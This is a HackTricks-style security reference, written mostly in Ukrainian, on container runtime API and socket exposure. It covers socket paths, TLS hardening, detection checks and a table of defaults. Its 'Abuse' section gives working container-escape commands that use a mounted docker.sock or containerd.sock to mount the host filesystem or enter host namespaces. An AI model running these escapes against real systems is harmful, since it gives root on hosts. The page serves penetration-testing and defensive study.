# Runtime API And Daemon Exposure

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

Багато реальних компрометацій контейнерів зовсім не починаються з втечі з namespace. Вони починаються з доступу до контрольної площини runtime. Якщо workload може звертатися до `dockerd`, `containerd`, CRI-O, Podman або kubelet через змонтований Unix-сокет або відкритий TCP-слухач, атакуючий може запросити створення нового контейнера з вищими привілеями, змонтувати файлову систему хоста, приєднатися до namespace хоста або отримати конфіденційну інформацію вузла. У таких випадках runtime API — це реальна межа безпеки, і компрометація його фактично прирівнюється до компрометації хоста.

Ось чому експозицію runtime-сокета слід документувати окремо від захистів ядра. Контейнер з типовими seccomp, capabilities і MAC confinement все ще може бути в один виклик API від компрометації хоста, якщо всередині змонтовано `/var/run/docker.sock` або `/run/containerd/containerd.sock`. Ізоляція ядра поточного контейнера може працювати саме так, як задумано, у той час як площина управління runtime залишається повністю відкрита.

## Моделі доступу до демона

Docker Engine традиційно відкриває привілейований API через локальний Unix-сокет за адресою `unix:///var/run/docker.sock`. Історично він також був доступний віддалено через TCP-слухачі, такі як `tcp://0.0.0.0:2375`, або через TLS-захищений слухач на `2376`. Відкриття демона для віддаленого доступу без надійного TLS та автентифікації клієнта фактично перетворює Docker API на віддалений root-інтерфейс.

containerd, CRI-O, Podman і kubelet відкривають подібні високоризикові поверхні. Імена та робочі процеси відрізняються, але логіка — ні. Якщо інтерфейс дозволяє виклику створювати workloads, змонтувати шляхи хоста, отримувати облікові дані або змінювати запущені контейнери, цей інтерфейс є привілейованим каналом управління і його слід відповідно трактувати.

Типові локальні шляхи, які варто перевірити:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Старіші або більш спеціалізовані стекі можуть також виставляти кінцеві точки, такі як `dockershim.sock`, `frakti.sock` або `rktlet.sock`. У сучасних середовищах вони зустрічаються рідше, але при їх виявленні до них слід ставитися з тією ж обережністю, оскільки вони представляють собою інтерфейси керування середовищем виконання, а не звичайні сокети додатків.

## Захищений віддалений доступ

Якщо daemon має бути доступний поза локальним сокетом, з'єднання слід захищати за допомогою TLS і, бажано, з взаємною автентифікацією, щоб daemon перевіряв клієнта, а клієнт — daemon. Стара звичка відкривати Docker daemon через незашифрований HTTP задля зручності — одна з найнебезпечніших помилок в адмініструванні контейнерів, оскільки поверхня API достатньо потужна, щоб безпосередньо створювати привілейовані контейнери.

Історично конфігурація Docker виглядала так:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
На хостах на базі systemd, взаємодія демона також може відображатися як `fd://`, що означає, що процес успадковує попередньо відкритий сокет від systemd замість того, щоб прив'язувати його безпосередньо самостійно. Важливий урок — не в точному синтаксисі, а в наслідках для безпеки. У той момент, коли демон слухає поза суворо обмеженим локальним сокетом, захист транспортного рівня та аутентифікація клієнта стають обов'язковими, а не опціональними заходами посилення.

## Зловживання

Якщо присутній runtime-сокет, переконайтеся, який саме він, чи існує сумісний клієнт і чи можливий доступ через raw HTTP або gRPC:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Ці команди корисні, бо дозволяють відрізнити мертвий шлях, змонтований але недоступний socket і живий привілейований API. Якщо client працює успішно, наступне питання — чи може API запустити новий container з host bind mount або з host namespace sharing.

### Повний приклад: Docker Socket To Host Root

Якщо `docker.sock` доступний, класична втеча — запустити новий container, який монтує host root filesystem, а потім виконати `chroot` у ньому:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Це забезпечує пряме виконання з правами root на хості через Docker daemon. Наслідки не обмежуються лише читанням файлів. Опинившись всередині нового контейнера, зловмисник може змінювати файли хоста, збирати облікові дані, імплантувати persistence або запускати додаткові привілейовані робочі навантаження.

### Full Example: Docker Socket To Host Namespaces

Якщо зловмисник віддає перевагу входу в неймспейс замість доступу лише до файлової системи:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Цей шлях добирається до хоста, попросивши runtime створити новий контейнер із явним виставленням host-namespace, а не експлуатуючи поточний.

### Повний приклад: containerd Socket

Змонтований `containerd` сокет зазвичай не менш небезпечний:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Наслідком знову є компрометація хоста. Навіть якщо Docker-specific tooling відсутнє, інший runtime API все одно може надати ті ж адміністративні повноваження.

## Перевірки

Мета цих перевірок — з'ясувати, чи може контейнер дістатися будь-якої площини управління, яка мала залишатися поза межею довіри.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
Що тут цікаво:

- Змонтований runtime-сокет зазвичай є прямим адміністративним примітивом, а не просто розкриттям інформації.
- TCP-слухач на `2375` без TLS слід розглядати як умову віддаленої компрометації.
- Змінні середовища, такі як `DOCKER_HOST`, часто вказують на те, що робоче навантаження було навмисно спроєктоване для зв'язку з runtime хоста.

## Налаштування середовища виконання за замовчуванням

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Local Unix socket by default | `dockerd` прослуховує локальний сокет, а демон зазвичай працює з root-привілеями | монтування `/var/run/docker.sock`, відкриття `tcp://...:2375`, слабкий або відсутній TLS на `2376` |
| Podman | Daemonless CLI by default | Для звичайного локального використання не потрібен довгоживучий привілейований демон; API-сокети все ще можуть бути відкриті, коли увімкнено `podman system service` | відкриття `podman.sock`, запуск служби в широкому доступі, використання API з root-привілеями |
| containerd | Local privileged socket | Адміністративний API доступний через локальний сокет і зазвичай використовується інструментами вищого рівня | монтування `containerd.sock`, широкий доступ через `ctr` або `nerdctl`, відкриття привілейованих неймспейсів |
| CRI-O | Local privileged socket | CRI-ендпоінт призначений для довірених компонентів, що працюють на вузлі | монтування `crio.sock`, відкриття CRI-ендпоінту для недовірених робочих навантажень |
| Kubernetes kubelet | Node-local management API | Kubelet не повинен бути широкодоступним з Pods; доступ може розкрити pod state, credentials та execution features залежно від authn/authz | монтування kubelet sockets або certs, слабка kubelet auth, host networking плюс досяжний kubelet endpoint |
{{#include ../../../banners/hacktricks-training.md}}
